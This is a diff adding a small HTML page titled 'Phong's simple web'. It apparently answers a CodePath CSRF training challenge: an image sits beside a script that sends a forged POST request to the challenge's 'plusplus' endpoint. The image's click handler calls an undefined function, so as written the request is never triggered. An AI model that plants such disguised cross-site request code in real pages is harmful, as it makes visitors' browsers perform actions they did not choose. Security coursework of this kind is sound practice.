@@ -1,0 +1,29 @@
+<html>
+<meta charset="UTF-8">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Phong's simple web</title>
+</head>
+
+<body>
+    <div id="intro-button-wrapper">
+        <!-- <a href="#about-me" class="btn btn-medium btn-dark btn-lg text-uppercase" id="intro-button">Let's take a
+          tour.</a> -->
+        <img id="image" src="https://bit.ly/3jFwe3d" onclick="openImg()">
+        <script>
+            function codepath() {
+                console.log("Clicking")
+                var xhr = new XMLHttpRequest();
+                var url =
+                    "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=9464f59d6612758dfdf3985b3f79f9efb804ea10"
+                xhr.open("POST", url, true);
+                xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://security.codepath.com/');
+                xhr.send();
+                console.log("Hello World")
+            }
+        </script>
+    </div>
+</body>
+
+</html>
